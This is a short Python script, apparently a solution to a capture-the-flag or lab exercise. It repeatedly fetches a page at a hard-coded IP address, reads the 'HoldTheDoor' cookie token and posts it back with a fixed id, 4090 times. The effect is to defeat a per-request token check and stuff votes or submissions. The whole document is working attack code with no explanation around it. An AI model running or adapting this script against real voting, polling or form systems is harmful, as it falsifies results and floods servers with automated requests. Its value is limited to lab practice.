#!/usr/bin/python3
import requests

host = "http://158.69.76.135/level1.php"
for i in range(4090):
    req_get = requests.get(host)
    payload = {'id': '1452', 'holdthedoor': 'submit',
               'key': req_get.cookies['HoldTheDoor']}
    cookies = {'HoldTheDoor': req_get.cookies['HoldTheDoor']}
    req_post = requests.post(host, payload, cookies=cookies)
